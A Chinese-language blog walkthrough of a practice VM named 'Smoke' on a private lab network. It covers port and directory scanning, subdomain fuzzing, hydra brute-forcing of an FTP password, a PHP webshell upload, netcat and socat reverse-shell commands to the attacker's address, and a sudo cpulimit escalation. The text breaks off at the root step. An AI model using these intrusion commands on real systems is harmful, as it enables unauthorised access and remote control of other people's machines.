---
title: 群友靶机之Smoke
url: https://mp.weixin.qq.com/s/hPuhf31aPYCjzmQXI5oMiw
source: Doonsec's feed
date: 2026-04-21
fetch_date: 2026-04-22T04:41:27.246007
---

# 群友靶机之Smoke

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8avkpGSKmqf7qR1nWRXEZvOr0SkX0ttG0gCSUPjSJbAlUuAEOYbZULFw4ptQTjjJJZfceDQSRofVJ3VicJe6W6d0AosQp7IrnJh9fGXibWADc/0?wx_fmt=jpeg)

# 群友靶机之Smoke

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

今天写一个Sublarge佬的Smoke靶机的wp

```
https://vortex.blog.csdn.net/
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeQvbc8kJ5mXXGWG2j99HGhuqYSbfMC8MhJxqmLaeEGESvbIBGlTDzuvk89ouz9m6yquT6VicetcxL9h4EgaDlibESib7m20jicP9E/640?wx_fmt=png&from=appmsg)

这是Sublarge佬的博客

一.信息收集

1.探测IP

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcQtBUQVlmQGHj2cia6c2svjSVNtibMiawGwfOkVxplLdwjZZZsYWibKJP2licOQgGZkIE4sFKY8PFAvC7iatkEHTYsZ8VlSXfbIrbks/640?wx_fmt=png&from=appmsg)

IP是192.168.137.143

2.探测端口

```
nmap -p- -sV 192.168.137.143
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfEOy5CqmyMeZ6ibhc381icYiaQldufJ2owf34HibNguq4MpUKHjPVtNDD30VzmPA19H1JAMVnxS1yhpFI592YphKBab55o4DsGEog/640?wx_fmt=png&from=appmsg)

端口开放21 22 80端口，我们就在21和80端口下手，然后在22端口进行登录

3.探测目录

在探测目前之前，我们需要IP和域名绑定

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdJAR21gBzn17V8L2fPId2xufyygDtdoWv0ap4AamTgAb5Yj01wa98vZHs1ibkeu3vpfV8aMo8dgnq5qDnqHj749icyhxpsmcazA/640?wx_fmt=png&from=appmsg)

绑定之后

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdWLoufjtmseh4VH7tz0Q0MibRJVpCasnibt7icnILatNdu7wWLCMtmTF8HEvUrHfscA5vyDv7ia1TzuyyUazmeZBakkOQI7L7PF7c/640?wx_fmt=png&from=appmsg)

```
gobuster dir -u http://smoke.dsz -w /usr/share/wordlists/dirb/big.txt -x php,txt,bak,zip,sh,config
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdHy5ic9KY6K4LwZNh3gwryHshLTuZpuJvYaCHvDlwTJTNqlPeO8GLda8G7LuoD9qUjibJ3ocqRT5txjiaGFA6QcAZItdAiaMdiclcU/640?wx_fmt=png&from=appmsg)

没有任何的东西，那么我们去80端口看看

二.访问IP

```
http://smoke.dsz/
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqe1eF3XFfhHpaSfylbic7icgRl753rHWdyucF7vlHkVGA9x25lCuKtHgbNicBKSE1iaLibrY4ED1yKhE1ywyB0Hrp0LxEFNfkhw1ia4E/640?wx_fmt=png&from=appmsg)

我们去这个页面看看

三.渗透测试

原来以为会存在命令执行漏洞的，结果发现什么都没有

1.命令执行漏洞

```
http://smoke.dsz/?target=_charts.stddev
```

我原来以为这里是存在命令执行漏洞的，但是不管我怎么去输入和测试，都发现输出的结果好像是预定好的

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcn0DrIR6RtcuApr6UlejyP6MKSmp2BAdvErGH3YXc1cCZunM5LCZbU7jb4qE80r5IrGGmXPqd0rdlnEicjSDS6HKvibbJSKunPA/640?wx_fmt=png&from=appmsg)

```
http://smoke.dsz/?target=Ping.AlpinelinuxOrg
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqe4nCsHmHSRLnWuX0aExyOicRExu4M3m9WZREViaOG8uy8kVQnib1ZTHLhibib6QKWatrdHkFkkqv2BK1OmYH0vJP7icD5VJPgqlLZHU/640?wx_fmt=png&from=appmsg)

我去测试在2个页面，最后没有任何的结果，我就放弃了

应该不在这个80端口上面，我们去看看21端口

2.ftp服务

首先，我们去使用anonymous登录，发现是登录不成功的

```
ftp 192.168.137.143
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeiaqgia55iawd1oe9FPRAKbPW6OHWvqSh6WX0TMA2qd2y8aWqwdG9qaTbPLiaSkY7g7jGGt7zXdI80bFPPtB2WOleVtu338nQWWec/640?wx_fmt=png&from=appmsg)

目前，我们没有掌握到任何的信息，80端口和21端口都尝试了，没有任何的信息，那么我们就需要去转换思路了。

3.子域名爆破

既然，我们访问的80端口是一个域名，我们去试试有没有子域名，我们使用wfuzz去爆破试试看

```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.smoke.dsz" --hw 29 --hc 404 http://smoke.dsz/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfv4fSEIpemUymZMf0Y5Xf52MpnOiaKKHg4WJCtntTyzYGZvibGWNhhxhYbFY2hmeKicUZibCEjlRTNYKyxKRxVaqz8Y4ltB6UAPIc/640?wx_fmt=png&from=appmsg)

OK，我们成功爆破出来一个ftpz子域名，我们去看看

```
http://ftp.smoke.dsz/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeex0Y0s1Megv8Vo6IfpjxXgvZ7uiarh1DWbFaXW43FxDZiaE0Le4zttm5U3PcrFEE7H9xEPvI38aQw53xkCB65YLpwMcudjmBzk/640?wx_fmt=png&from=appmsg)

4.文件上传

刚刚开始，我以为是一个文件上传漏洞，我去上传文件，发现只能上传png文件好像是，上传不了php。

然后我就是各种绕过，修改后缀名，修改文件类型，%00绕过，在文件里面添加GIF89a,但是添加之后图片后缀名就变成了gif,一直没有成功。

然后我就在想既然有文件上传页面，那么肯定有uploads目录，我就去查看

```
http://ftp.smoke.dsz/uploads/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeCcQW4iajrxOWsVib4GTyaUCzAluImZV0vfN3PrCjwGaHiazMUXWVHtqQ3QqnkmpGupC7Qaj8UHYCHH2hlRicN020cmjNlZJfObd0/640?wx_fmt=png&from=appmsg)

我们可以看到一个passwd,我们去查看，还有看到ssh用户名和ftp的用户名

```
http://ftp.smoke.dsz/uploads/passwd
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfGuaQzRtPzib2xN7osDx2Xk93zGS6VAEAnY7DdZ8zaAesoI25JlFBv05t5WG24Qc64e1JcOt5G0ICBNjdJvL9pVMGibWGUa2T3U/640?wx_fmt=png&from=appmsg)

5.爆破

然后我就去爆破ssh用户名的密码，发现一直没有爆破成功，我就去爆破ftp用户名的密码，爆破成功了 kelvin

大概爆破了5分钟

```
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.137.143
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfPRib3osCTesCqibTyS6X4ibbka4fsWnjZjTbhkVEspgpTLmb1hR4wtI4SGiaYdcCgicCbUBDo6cA4cSxZicCteJpDBGr8EkbJRuFQg/640?wx_fmt=png&from=appmsg)

那么我们去登录看看

```
 lftp ftp://ftpuser:kelvin@192.168.137.143
```

我们可以看到登录成功，而且里面有2个文件，我们去看看

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdVcnyicia1rM8A9jSYPFMYDE0TptCH088xZLZia9kdCCZ1ZlUDvQGOt8z6siblGSLEexH3JMZskHAbdmg01xmBTyvMLU6QddrNYhU/640?wx_fmt=png&from=appmsg)

发现没有什么用，我们试试能不能去上传文件吧，如果可以上传文件，那么就一句话木马解决

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdHGkz6qw73TRibXgcNYqGYVSbPrPY6Hicy6JTZ2KEARaAXOcwKKibCLYUHL0rVPjIC7OSZVBx5KvbY8Pp1t4p24I8mGyibJhoic1vw/640?wx_fmt=png&from=appmsg)

我们可以看到可以上传文件的，那么我们就去/var/www/hml里面去上传文件

6.上传文件

然后我去/var/www/html/里面上传文件，发现没有这个目录![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_6@2x.png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdrkftvuzcZs03KjHB6a0me7bvwh6jDQusML0XbkocT7C4BflebDxsrNoUlkYGqLAUHt3Tq0RmuAoHIFo69ggwaolslbqVG4mo/640?wx_fmt=png&from=appmsg)

好，结果是Sublarge佬更改了目录

最后的目录是

```
var/www/vhosts/ftp.smoke.dsz/uploads
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcT5SMFU42ayrObMZF2iaJsU1nmb7qYqjWNOiaOZ1UKuDH747otIJe7uTHxroZOIA4uKPyGbLB9weESrxj544uzibbaCjxV3TZXSw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdcMECrn0tA62EaNPmPPUavgpvIFQf0ZGjVFBfqUXAqjtVicQU7dy8icexPUPmJksotXibDYdAm2dLbJwDW8Ft7ia3iccmltyvYsCRQ/640?wx_fmt=png&from=appmsg)

7.反弹shell

```
http://ftp.smoke.dsz/uploads/12138.php?cmd=id
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeKCOiaUkQ0gT17AMohKbJsOpAP0UFDI3Viat3debcOzGfwGS4njibeVzMz4fwuJZ8JuOJS2tAiayibDrQeEmWDKIknhpcAPo3paaak/640?wx_fmt=png&from=appmsg)

```
http://ftp.smoke.dsz/uploads/12138.php?cmd=busybox%20nc%20192.168.137.102%201234%20-e%20/bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqexMM4wibvOR32GYW0DO9g3ZKLj6lpbdkzHiaciaVVFSkZ5GEibibCJaicZ0XF9vM2fFq1fsTRZVT656eibTn9U8Blt3iaK4MiaUEpHlIaw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcTb1dUmIB2mzhIS5mKSiad86bLiaJ26uDdmPsuU3aF3M34QysLqDnhibaCy8V1BGiaayaDff6icrM7qDPgBW83Rlh8eZLlFkz7NxmM/640?wx_fmt=png&from=appmsg)

我们可以可以看到成功的，稳定shell

我们发现这2个方法都没有办法去稳定shell

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdOkGRE1vqSSZFSiaiccOkSCu12pwtiabM7fzbtiahkq5Z8c86ABXV7TUMTZAzLoSlV5qkibtYib4KDvPjVbbNzsw2EXyFknLfVeW4R0/640?wx_fmt=png&from=appmsg)

那么我们去使用socat去稳定shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdLJibCvMicicnbJia0sic5sNst9YtGLCib5MTPmq8ibUg77JI0TdKtcghuIlLmQQOMu7YRkUhcnfZDib3DQ6BsjbuxiaoFUk8cczFc0LOY/640?wx_fmt=png&from=appmsg)

我们在/tmp/里面上传socat,然后去稳定

攻击机

```
socat FILE:`tty`,raw,echo=0 TCP-L:5555
```

目标机

```
./socat TCP:192.168.137.102:5555 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

我们可以看到稳定成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqex3DC8PYXCIkTicDf9OIpo474Hwv6hqkVJI1ydGtK6JWp2JZ4GibdYY1afxHTKQcZFicUwFKRkv1ibdC5nVHKxYyS6xqyia2Kg1WZI/640?wx_fmt=png&from=appmsg)

8.切换用户

我们在家目录下，看到2个用户名，目前我们都没有权限去进入，但是之前我们知道ftpuser的密码是kelvin，我们去登录发现登录成功。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqd9JKvPtGjkXvfDk0gNBNNEU4byjkZHSy8hFurf5BfuVmGZUzFN4AYiaYLrgYmRp1lIhSLBg5ABze3P66rPkUKW1fl1vyWfIR4A/640?wx_fmt=png&from=appmsg)

然后去sudo -l 发现可以去使用cpulimit的，我们去看看。

```
cpulimit 有一个功能：它可以在限制 CPU 使用率的同时，直接启动并运行另一个命令。因为你被允许以 tkbic 的身份运行 cpulimit，那么通过 cpulimit 启动的任何命令，其权限都会变成 tkbic。
```

```
sudo -u tkbic /usr/bin/cpulimit -l 100 -- /bin/bash
```

直接一条命令就解决了

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcIyia2x3bUeiaepbueBvefyw9sKUtqPQwewVV8b5cosHYq35jyowJn0bNmP23lmX4e2UBPZnY4QNPNJZm1yibuKedZ9yq7icBkxEM/640?wx_fmt=png&from=appmsg)

本来我想的user.txt在目录下，结果没有没关系，我们去提权到root提权在说吧。

9.提权

ok ,开始我的踩雷之旅![](https://res.wx.qq.com/t/wx_fed/we-emoji/re...